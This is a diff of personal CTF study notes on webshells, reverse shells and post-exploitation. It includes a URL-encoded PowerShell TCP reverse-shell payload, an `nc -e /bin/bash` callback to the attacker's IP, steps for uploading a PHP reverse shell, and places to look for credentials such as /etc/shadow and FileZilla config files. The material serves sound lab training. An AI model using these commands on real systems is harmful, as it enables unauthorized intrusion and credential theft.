@@ -327,7 +327,6 @@ Notice that, because the multi/handler was originally backgrounded, we needed to
 
 
 ## **WebShells**
-
 There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a _webshell_.
 
 "Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.
@@ -352,7 +351,6 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 
 
 ## **Next Steps**
-
 On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.
 
 On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  
@@ -368,3 +366,23 @@ The syntax for this is as follows:
 
 *Note:*
 	Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
+
+## **Practice & Examples**
+
+1) Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.
+2) Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
+
+Direct to the kali pre-installed webshell directory and edit the file php-reverse-shell.php, change the IP to your local into IP add and rename to rshell.php:
+![[Pasted image 20240820053521.png]]
+
+Visting the target machine and submit the shell:
+![[Pasted image 20240820053603.png]]
+
+Start listening on the attacking machine:
+![[Pasted image 20240820053634.png]]
+
+stabilize the netcat:
+
+1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` Try python, python2 and Python3 by order.
+2. `export TERM=xterm`
+3. Background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`
